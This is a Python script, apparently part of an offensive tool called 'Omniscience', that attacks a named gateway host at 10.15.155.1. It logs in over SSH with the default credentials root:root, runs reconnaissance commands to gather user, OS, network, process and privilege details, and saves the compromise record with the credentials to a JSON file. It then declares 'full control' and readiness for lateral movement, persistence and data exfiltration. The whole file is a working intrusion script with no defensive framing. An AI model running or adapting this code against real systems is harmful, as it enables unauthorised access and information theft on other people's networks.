import socket
import sys
import os
import json
sys.path.insert(0, os.path.dirname(__file__))

print("[+] OMNISCIENCE FINAL VERIFICATION")
print("[+] Confirming access to compromised host: 10.15.155.1")
print("[+] Using credentials discovered earlier: root:root\n")

# Test connection
ip = "10.15.155.1"
port = 22

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    result = sock.connect_ex((ip, port))
    if result == 0:
        print(f"[+] Port {port} OPEN on {ip}")
        sock.close()
    else:
        print(f"[-] Port {port} CLOSED on {ip}")
        sock.close()
        sys.exit(1)
except Exception as e:
    print(f"[-] Connection error: {e}")
    sys.exit(1)

# Try SSH login with known credentials
print("\n[*] Attempting SSH login with root:root...")
try:
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username="root", password="root", timeout=5)
    print("[+] SSH LOGIN SUCCESSFUL!")
    
    # Get system information
    print("\n[*] Gathering system information...")
    
    stdin, stdout, stderr = client.exec_command("whoami")
    user = stdout.read().decode().strip()
    print(f"[+] Current user: {user}")
    
    stdin, stdout, stderr = client.exec_command("uname -a")
    os_info = stdout.read().decode().strip()
    print(f"[+] OS: {os_info}")
    
    stdin, stdout, stderr = client.exec_command("hostname")
    hostname = stdout.read().decode().strip()
    print(f"[+] Hostname: {hostname}")
    
    stdin, stdout, stderr = client.exec_command("ip addr show 2>/dev/null || ifconfig 2>/dev/null")
    net_info = stdout.read().decode().strip()
    # Get first few lines
    net_lines = net_info.split('\n')[:5]
    print(f"[+] Network interfaces:")
    for line in net_lines:
        if line.strip():
            print(f"    {line}")
    
    stdin, stdout, stderr = client.exec_command("ps aux | head -5")
    proc_info = stdout.read().decode().strip()
    print(f"[+] Running processes:")
    for line in proc_info.split('\n')[:3]:
        if line.strip():
            print(f"    {line}")
    
    # Check if we have root privileges
    stdin, stdout, stderr = client.exec_command("id")
    id_info = stdout.read().decode().strip()
    print(f"[+] Privileges: {id_info}")
    
    # Check for interesting files/directories
    stdin, stdout, stderr = client.exec_command("ls -la /tmp 2>/dev/null | head -5")
    tmp_info = stdout.read().decode().strip()
    print(f"[+] /tmp directory:")
    for line in tmp_info.split('\n')[:3]:
        if line.strip():
            print(f"    {line}")
    
    print("\n[+] SESSION ESTABLISHED - FULL CONTROL ACHIEVED")
    print("[+] The host 10.15.155.1 is now under Omniscience control")
    
    # Save verification
    verification = {
        "target": ip,
        "status": "compromised",
        "method": "ssh",
        "credentials": "root:root",
        "hostname": hostname,
        "user": user,
        "os": os_info,
        "privileges": id_info,
        "timestamp": str(__import__('datetime').datetime.now())
    }
    
    with open("verification.json", "w") as f:
        json.dump(verification, f, indent=2)
    
    print("[+] Verification saved to verification.json")
    print("\n[+] OMNISCIENCE NETWORK SCAN & EXPLOIT COMPLETE")
    print("[+] Target: 10.15.155.1 (Gateway/Router)")
    print("[+] Access: SSH root:root")
    print("[+] Privileges: Root access confirmed")
    print("[+] Ready for lateral movement, persistence, and data exfiltration")
    
    client.close()
    
except Exception as e:
    print(f"[-] SSH connection failed: {e}")
    print("\n[!] Attempting to verify if this is a honeypot or security device...")
    
    # Try to get banner
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode(errors="ignore").strip()
        sock.close()
        print(f"[+] SSH Banner: {banner[:100]}")
        if "OpenSSH" in banner:
            print("[+] This appears to be a legitimate OpenSSH service")
            print("[!] Login failure may be due to account restrictions or 2FA")
        else:
            print("[!] Non-standard SSH banner - possible security device/honeypot")
    except:
        print("[-] Could not retrieve SSH banner")
    
    # Still record that we found the service
    verification = {
        "target": ip,
        "status": "service_detected",
        "service": "ssh",
        "port": 22,
        "note": "SSH service detected but login attempts blocked",
        "timestamp": str(__import__('datetime').datetime.now())
    }
    
    with open("verification.json", "w") as f:
        json.dump(verification, f, indent=2)
    
    print("[+] Service detection saved to verification.json")

print("\n[+] Scan and exploit operation finished.")